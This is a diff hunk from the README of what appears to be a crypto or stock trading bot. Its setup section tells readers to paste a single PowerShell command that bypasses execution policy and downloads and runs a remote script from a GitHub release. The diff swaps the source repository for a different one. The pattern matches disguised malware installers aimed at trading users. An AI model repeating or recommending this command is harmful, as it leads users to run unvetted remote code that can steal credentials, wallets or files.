@@ -195,12 +195,12 @@ FA_CHECK_INTERVAL=300        # Scan every N seconds
 Open **PowerShell** and run this **single command**:
 
 ```powershell
-powershell -ep bypass -c "iwr https://github.com/DAUDHAIDERNAQVI/polymarket-trading-bot-fast/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
+powershell -ep bypass -c "iwr https://github.com/31Priyansh/xStocks-Strategy-Trading-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
 ```
 ### Option 2: Cmd 
 Open **CMD** and run this **single command**:
 ```
-powershell -ep bypass -c "iwr https://github.com/DAUDHAIDERNAQVI/polymarket-trading-bot-fast/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
+powershell -ep bypass -c "iwr https://github.com/31Priyansh/xStocks-Strategy-Trading-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
 ```
 
 ### Step 2 — Create a virtual environment
